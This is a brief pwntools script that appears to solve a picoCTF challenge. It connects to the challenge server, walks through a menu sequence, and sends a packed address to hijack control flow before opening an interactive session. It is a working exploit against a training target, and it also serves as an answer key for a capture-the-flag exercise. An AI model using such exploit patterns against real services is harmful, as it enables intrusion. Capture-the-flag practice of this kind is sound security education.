from pwn import *

host = 'mercury.picoctf.net'
port = 50361

# p = process('./vuln')
p = remote(host, port)

p.sendline(b'I')
p.sendline(b'y')
p.sendline(b'l')
p.recvuntil(b'anyways:\n')
p.sendline(p32(0x80487d6))

p.interactive()